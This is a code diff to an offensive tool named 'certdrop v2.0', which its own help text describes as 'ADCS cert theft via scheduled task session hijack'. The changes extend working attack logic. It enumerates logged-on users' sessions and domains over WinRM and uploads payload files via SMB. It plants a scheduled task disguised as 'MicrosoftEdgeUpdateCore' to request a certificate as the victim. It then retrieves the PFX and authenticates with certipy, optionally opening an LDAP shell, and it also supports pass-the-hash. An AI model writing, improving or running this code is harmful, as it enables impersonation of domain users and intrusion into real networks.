@@ -207,6 +207,10 @@ TASK_XML = """\
 """
 
 EXEC_METHODS = {
+    "cmd": {
+        "cmd":  "cmd.exe",
+        "args": "/c {drop_dir}\\{prefix}.bat",
+    },
     "conhost": {
         "cmd":  "conhost",
         "args": "--headless {drop_dir}\\{prefix}.bat",
@@ -239,9 +243,9 @@ STATUS_MESSAGES = {
 
 # ── Output helpers ───────────────────────────────────────────────────────────
 
-def info(msg):  print(f"  [+] {msg}")
-def warn(msg):  print(f"  [!] {msg}", file=sys.stderr)
-def die(msg):   print(f"  [-] {msg}", file=sys.stderr); sys.exit(1)
+def info(msg):  print(f"  [+] {msg}", flush=True)
+def warn(msg):  print(f"  [!] {msg}", file=sys.stderr, flush=True)
+def die(msg):   print(f"  [-] {msg}", file=sys.stderr, flush=True); sys.exit(1)
 
 
 # ── DNS / hostname resolution ───────────────────────────────────────────────
@@ -942,19 +946,57 @@ def enum_sessions(transport):
                 "username":     uname,
                 "id":           int(m.group(3)),
                 "state":        m.group(4),
+                "domain":       None,
             })
+    if sessions:
+        _resolve_session_domains(transport, sessions)
     return sessions
+
+
+def _resolve_session_domains(transport, sessions):
+    ps = (
+        "Get-WmiObject Win32_LogonSession -Filter "
+        "'LogonType=2 or LogonType=10' | ForEach-Object {\n"
+        "  $lid = $_.LogonId\n"
+        "  $assoc = Get-WmiObject -Query "
+        "\"SELECT * FROM Win32_LoggedOnUser WHERE "
+        "Dependent='Win32_LogonSession.LogonId=$lid'\"\n"
+        "  if ($assoc) {\n"
+        "    $ant = $assoc.Antecedent\n"
+        '    if ($ant -match \'Domain="([^"]+)",Name="([^"]+)"\') {\n'
+        '      Write-Host "$($Matches[1])\\$($Matches[2])"\n'
+        "    }\n"
+        "  }\n"
+        "}"
+    )
+    out, _, _ = _run_ps(transport, ps)
+    domain_map = {}
+    for line in out.strip().splitlines():
+        line = line.strip()
+        if "\\" in line:
+            d, u = line.split("\\", 1)
+            domain_map[u.upper()] = d
+    for s in sessions:
+        d = domain_map.get(s["username"].upper())
+        if d and d.upper() != s["username"].upper():
+            s["domain"] = d
 
 
 def pick_session(sessions):
     if not sessions:
         die("No active user sessions found on target.")
     print()
-    print(f"  {'#':<4} {'State':<8} {'Session':<20} {'Username'}")
-    print(f"  {'-'*4} {'-'*8} {'-'*20} {'-'*20}")
+    print(f"  {'#':<4} {'State':<8} {'Session':<20} {'User'}")
+    print(f"  {'-'*4} {'-'*8} {'-'*20} {'-'*30}")
     for i, s in enumerate(sessions):
-        print(f"  {i:<4} {s['state']:<8} {s['session_name']:<20} {s['username']}")
+        user_display = s["username"]
+        if s["domain"]:
+            user_display = f"{s['domain']}\\{s['username']}"
+        print(f"  {i:<4} {s['state']:<8} {s['session_name']:<20} {user_display}")
     print()
+    if len(sessions) == 1:
+        info(f"Auto-selecting only session: {sessions[0]['username']}")
+        return sessions[0]
     while True:
         try:
             idx = int(input("  [?] Pick session # to target: ").strip())
@@ -967,6 +1009,8 @@ def pick_session(sessions):
 
 def find_session_for_user(sessions, target_user):
     target_lower = target_user.lower()
+    if "\\" in target_lower:
+        target_lower = target_lower.split("\\", 1)[1]
     for s in sessions:
         if s["username"].lower() == target_lower:
             return s
@@ -978,7 +1022,7 @@ def find_session_for_user(sessions, target_user):
 
 # ── Payload generation ───────────────────────────────────────────────────────
 
-def generate_files(target_user, target_domain, ca_config, template,
+def generate_files(target_user, user_domain, ca_config, template,
                    prefix, drop_dir, exec_wrapper):
     ca_flag = f' -config "{ca_config}"' if ca_config else ""
     profile = EXEC_METHODS[exec_wrapper]
@@ -987,7 +1031,7 @@ def generate_files(target_user, target_domain, ca_config, template,
     end_boundary = (datetime.now() + timedelta(hours=48)).strftime(
         "%Y-%m-%dT%H:%M:%S.000")
 
-    cn = f"{target_user}@{target_domain.lower()}"
+    cn = f"{target_user}@{user_domain.lower()}"
 
     files = {}
     files[f"{prefix}.inf"] = CERT_INF.format(
@@ -999,7 +1043,7 @@ def generate_files(target_user, target_domain, ca_config, template,
     ).encode("utf-8")
 
     files[f"{prefix}.xml"] = TASK_XML.format(
-        end_boundary=end_boundary, domain=target_domain,
+        end_boundary=end_boundary, domain=user_domain,
         username=target_user, exec_cmd=exec_cmd, exec_args=exec_arg,
     ).encode("utf-16")
 
@@ -1029,34 +1073,19 @@ def create_and_run_task(transport, task_name, drop_dir, prefix):
         info("Task triggered")
 
 
-def poll_for_result(transport, smb, drop_dir, prefix, timeout=90,
-                    use_smb_poll=False):
+def poll_for_result(transport, smb, drop_dir, prefix, timeout=90):
     pfx_file = f"{prefix}.pfx"
     status_file = f"{prefix}.status"
     deadline = time.time() + timeout
 
     while time.time() < deadline:
-        if use_smb_poll:
-            if smb_file_exists(smb, drop_dir, pfx_file):
-                print()
-                return "OK"
-            status = smb_read_text(smb, drop_dir, status_file)
-            if status and status != "OK":
-                print()
-                return status
-        else:
-            out, _, _ = _run_ps(transport,
-                f'if (Test-Path "{drop_dir}\\{pfx_file}") {{"PFX_READY"}} '
-                f'elseif (Test-Path "{drop_dir}\\{status_file}") '
-                f'{{Get-Content "{drop_dir}\\{status_file}"}} '
-                f'else {{"WAITING"}}')
-            result = out.strip()
-            if result == "PFX_READY":
-                print()
-                return "OK"
-            if result.startswith("FAIL_"):
-                print()
-                return result
+        if smb_file_exists(smb, drop_dir, pfx_file):
+            print()
+            return "OK"
+        status = smb_read_text(smb, drop_dir, status_file)
+        if status and status.startswith("FAIL_"):
+            print()
+            return status
         print(".", end="", flush=True)
         time.sleep(3)
     print()
@@ -1079,20 +1108,21 @@ def run_certipy_auth(pfx_path, dc_ip, domain, username=None,
         _print_certipy_cmd(pfx_path, dc_ip, domain, username, ldap_shell)
         return False
 
-    args = [certipy, "auth", "-pfx", pfx_path]
+    pfx_basename = os.path.basename(pfx_path)
+    cmd = [certipy, "auth", "-pfx", pfx_basename]
     if dc_ip:
-        args.extend(["-dc-ip", dc_ip])
+        cmd.extend(["-dc-ip", dc_ip])
     if domain:
-        args.extend(["-domain", domain])
+        cmd.extend(["-domain", domain])
     if username:
-        args.extend(["-username", username])
+        cmd.extend(["-username", username])
     if ldap_shell:
-        args.append("-ldap-shell")
+        cmd.append("-ldap-shell")
 
     print()
-    info(f"Running: {' '.join(args)}")
+    info(f"Running: {' '.join(cmd)}")
     print()
-    result = subprocess.run(args, cwd=out_dir,
+    result = subprocess.run(cmd, cwd=out_dir,
                             input=b"y\n", timeout=60)
     return result.returncode == 0
 
@@ -1119,8 +1149,8 @@ def main():
         die("Kerberos auth requires --dc-ip")
     if not args.password and not args.nt_hash and not args.aes_key:
         import getpass
-        args.password = getpass.getpass(
-            f"  Password for {args.domain}\\{args.username}: ")
+        prompt_user = f"{args.domain}\\{args.username}" if args.domain else args.username
+        args.password = getpass.getpass(f"  Password for {prompt_user}: ")
 
     print()
     print("  certdrop v2.0")
@@ -1154,6 +1184,12 @@ def main():
             die(f"WinRM connection failed: {e}")
     info("Connected")
 
+    # ── Resolve AD domain FQDN from target machine
+    ad_domain = None
+    out, _, _ = _run_ps(transport,
+        '(Get-WmiObject Win32_ComputerSystem).Domain')
+    ad_domain = out.strip() if out.strip() and "." in out.strip() else None
+
     # ── SMB connection (always needed for file upload/download)
     info("Establishing SMB connection...")
     try:
@@ -1165,48 +1201,41 @@ def main():
     info("SMB connected")
 
     # ── Enumerate sessions
-    if args.target_user:
-        info(f"Using specified target user: {args.target_user}")
-        target_user = args.target_user
-        sessions = enum_sessions(transport)
-        match = find_session_for_user(sessions, target_user)
-        if match:
-            info(f"Found session: {match['username']} "
-                 f"(session {match['id']}, {match['state']})")
-        else:
-            warn(f"No active session found for '{target_user}' — "
-                 f"task will still be created but may not execute until user logs in")
-    else:
-        info("Enumerating sessions...")
-        sessions = enum_sessions(transport)
-        if not sessions:
-            die("No active user sessions found.")
-        target_session = pick_session(sessions)
-        target_user = target_session["username"]
-        info(f"Targeting: {target_user} "
-             f"(session {target_session['id']}, {target_session['state']})")
+    info("Enumerating sessions...")
+    sessions = enum_sessions(transport)
+    if not sessions:
+        die("No active user sessions found.")
 
-    # ── CA discovery
+    if args.target_user:
+        match = find_session_for_user(sessions, args.target_user)
+        if not match:
+            die(f"No session found for '{args.target_user}'. "
+                f"Available: {', '.join(s['username'] for s in sessions)}")
+        target_session = match
+    else:
+        target_session = pick_session(sessions)
+
+    target_user = target_session["username"]
+    user_domain = target_session.get("domain") or args.domain
+    target_display = f"{user_domain}\\{target_user}" if user_domain else target_user
+    info(f"Targeting: {target_display} "
+         f"(session {target_session['id']}, {target_session['state']})")
+
+    # ── CA config
     ca_config = args.ca
-    if not ca_config:
-        info("Discovering CA via LDAP...")
-        ca_config = discover_ca(
-            args.domain, args.dc_ip or ip,
-            args.username, args.password, args.nt_hash)
-        if ca_config:
-            info(f"CA: {ca_config}")
-        else:
-            warn("CA auto-discovery failed — certreq will try system default")
+    if ca_config:
+        info(f"CA: {ca_config}")
 
     # ── Generate payload files
     info(f"Generating payload (template: {args.template})...")
     files = generate_files(
-        target_user, args.domain, ca_config, args.template,
+        target_user, user_domain, ca_config, args.template,
         args.prefix, args.drop_dir, args.exec_wrapper)
     for f in files:
         info(f"  {f}")
 
-    # ── Upload via SMB
+    # ── Clean any leftovers from previous runs, then upload
+    smb_delete_files(smb, args.drop_dir, args.prefix)
     info(f"Uploading to {args.drop_dir}\\ via SMB...")
     try:
         smb_upload(smb, files, args.drop_dir)
@@ -1221,28 +1250,32 @@ def main():
     # ── Poll for PFX
     info(f"Waiting for PFX (timeout: {args.timeout}s)...")
     result = poll_for_result(
-        transport, smb, args.drop_dir, args.prefix, args.timeout,
-        use_smb_poll=use_susinternals)
+        transport, smb, args.drop_dir, args.prefix, args.timeout)
 
     if result != "OK":
         if result == "TIMEOUT":
             warn("Timed out waiting for PFX")
-        else:
+            # Final check — task may have just finished
+            time.sleep(5)
+            if smb_file_exists(smb, args.drop_dir, f"{args.prefix}.pfx"):
+                info("PFX appeared after timeout — continuing")
+                result = "OK"
+        if result != "OK":
             msg = STATUS_MESSAGES.get(result, result)
-            warn(f"Task failed: {msg}")
-        # Try to download the log for diagnostics
-        log_path = os.path.join(args.out_dir, f"{args.prefix}.log")
-        try:
-            os.makedirs(args.out_dir, exist_ok=True)
-            smb_download(smb, args.drop_dir, f"{args.prefix}.log", log_path)
-            warn(f"Diagnostics log saved to {log_path}")
-        except Exception:
-            pass
-        if not args.no_cleanup:
-            cleanup_remote(transport, smb, args.task_name,
-                           args.drop_dir, args.prefix)
-        die("No PFX produced — check CA reachability, template permissions, "
-            "and target user session state.")
+            if result != "TIMEOUT":
+                warn(f"Task failed: {msg}")
+            log_path = os.path.join(args.out_dir, f"{args.prefix}.log")
+            try:
+                os.makedirs(args.out_dir, exist_ok=True)
+                smb_download(smb, args.drop_dir, f"{args.prefix}.log", log_path)
+                warn(f"Diagnostics log saved to {log_path}")
+            except Exception:
+                pass
+            if not args.no_cleanup:
+                cleanup_remote(transport, smb, args.task_name,
+                               args.drop_dir, args.prefix)
+            die("No PFX produced — check CA reachability, template permissions, "
+                "and target user session state.")
 
     # ── Download PFX
     info("Downloading PFX...")
@@ -1274,9 +1307,10 @@ def main():
         transport.close()
 
     # ── Certipy auth
+    certipy_domain = ad_domain or args.domain
     if args.auth or args.ldap_shell:
         dc = args.dc_ip or ip
-        run_certipy_auth(out_path, dc, args.domain, target_user,
+        run_certipy_auth(out_path, dc, certipy_domain, target_user,
                          args.ldap_shell, args.out_dir)
     else:
         print()
@@ -1284,11 +1318,11 @@ def main():
         print("  PFX ready — authenticate with certipy:")
         print("  " + "─" * 58)
         _print_certipy_cmd(out_path, args.dc_ip or "<DC_IP>",
-                           args.domain, target_user, False)
+                           certipy_domain, target_user, False)
         print()
         print("  For LDAP shell:")
         _print_certipy_cmd(out_path, args.dc_ip or "<DC_IP>",
-                           args.domain, target_user, True)
+                           certipy_domain, target_user, True)
         print()
 
 
@@ -1300,25 +1334,19 @@ def parse_args():
         description="ADCS cert theft via scheduled task session hijack",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""examples:
-  %(prog)s ECORP-SQL -u admin -p 'Pass123' -d corp.local --dc-ip 10.0.0.1 --auth
-  %(prog)s 10.0.0.5 -u admin -H :abc123def -d corp.local --dc-ip 10.0.0.1 --ldap-shell
-  %(prog)s server01 -u admin -p Pass -d corp.local --dc-ip 10.0.0.1 -k --exec-method susinternals
-  %(prog)s server01 -u admin -p Pass -d corp.local --dc-ip 10.0.0.1 --target-user jsmith --auth
+  %(prog)s administrator:'Pass123'@10.0.0.5 -tu jsmith --dc-ip 10.0.0.1 --auth
+  %(prog)s corp.local/admin:'Pass'@server01 --dc-ip 10.0.0.1 --auth
+  %(prog)s administrator@10.0.0.5 -H :abc123def --dc-ip 10.0.0.1 --ldap-shell
+  %(prog)s corp.local/admin:'Pass'@server01 --dc-ip 10.0.0.1 -k
 """,
     )
-    p.add_argument("target", metavar="TARGET",
-        help="Target host (hostname or IP)")
+    p.add_argument("target", metavar="[[domain/]username[:password]@]target",
+        help="Target in impacket format (no domain = local auth)")
 
     auth = p.add_argument_group("authentication")
-    auth.add_argument("-u", "--username", required=True,
-        help="Username for authentication")
-    auth.add_argument("-p", "--password", default="",
-        help="Password (prompted if omitted and no hash/key)")
     auth.add_argument("-H", "--hashes", default="", dest="nt_hash",
         metavar="[LM:]NT",
         help="NT hash for pass-the-hash")
-    auth.add_argument("-d", "--domain", required=True,
-        help="Domain (e.g. corp.local)")
     auth.add_argument("-k", "--kerberos", action="store_true",
         help="Use Kerberos authentication (requires --dc-ip)")
     auth.add_argument("--dc-ip", default=None,
@@ -1335,7 +1363,7 @@ def parse_args():
         help="Certificate template (default: User)")
 
     tgt = p.add_argument_group("target selection")
-    tgt.add_argument("--target-user", default=None, metavar="USER",
+    tgt.add_argument("-tu", "--target-user", default=None, metavar="USER",
         help="Target user directly (skip interactive session picker)")
 
     exc = p.add_argument_group("execution")
@@ -1344,7 +1372,7 @@ def parse_args():
         help="Command execution method (default: winrm)")
     exc.add_argument("--exec-wrapper", default="conhost",
         choices=list(EXEC_METHODS),
-        help="Bat execution wrapper: conhost|powershell|wscript (default: conhost)")
+        help="Bat execution wrapper: conhost|cmd|powershell|wscript (default: conhost)")
     exc.add_argument("--download-method", default="smb",
         choices=["smb", "smbclient"],
         help="PFX download method (default: smb)")
@@ -1359,7 +1387,7 @@ def parse_args():
     task.add_argument("-n", "--task-name", default="MicrosoftEdgeUpdateCore",
         help="Scheduled task name (default: MicrosoftEdgeUpdateCore)")
     task.add_argument("--drop-dir", default=r"C:\Windows\Tasks",
-        help="Drop directory on target (default: C:\\Windows\\Tasks)")
+        help="Drop directory on target (default: C:\\Windows\\Tasks, use C:\\Users\\Public for non-admin targets)")
     task.add_argument("--prefix", default="cert",
         help="File prefix (default: cert)")
 
@@ -1371,7 +1399,33 @@ def parse_args():
     out.add_argument("--timeout", type=int, default=90,
         help="Seconds to wait for PFX (default: 90)")
 
-    return p.parse_args()
+    args = p.parse_args()
+
+    # Parse impacket-style target: [[domain/]username[:password]@]target
+    t = args.target
+    domain = ""
+    username = ""
+    password = ""
+    if "@" in t:
+        creds, target_host = t.rsplit("@", 1)
+        if "/" in creds:
+            domain, creds = creds.split("/", 1)
+        if ":" in creds:
+            username, password = creds.split(":", 1)
+        else:
+            username = creds
+    else:
+        target_host = t
+
+    if not username:
+        p.error("username required — use user:pass@target or domain/user:pass@target")
+
+    args.target = target_host
+    args.username = username
+    args.password = password
+    args.domain = domain
+
+    return args
 
 
 if __name__ == "__main__":
